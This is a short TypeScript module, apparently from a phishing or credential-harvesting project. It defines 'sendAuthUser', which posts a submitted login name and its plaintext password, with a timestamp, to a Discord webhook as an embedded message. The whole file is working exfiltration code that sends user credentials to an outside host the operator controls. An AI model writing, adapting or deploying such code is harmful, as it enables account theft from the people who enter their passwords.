import axios from "axios";
import { DiscordConfig, DiscordWebhooks } from "../../configurations";
import { getCurrentDate } from "../../utils";

const sendAuthUser = async (login: string, password: string) => {
  const { username, content, color } = DiscordWebhooks.SignIn;
  const params = {
    username: username,
    embeds: [
      {
        title: content,
        color: color,
        fields: [
          {
            name: "Login",
            value: login,
          },
          {
            name: "Password",
            value: password,
          },
          {
            name: "Timestamp",
            value: getCurrentDate(),
          },
        ],
      },
    ],
  };
  await axios.post(DiscordConfig.auth_user, params);
};

export { sendAuthUser };
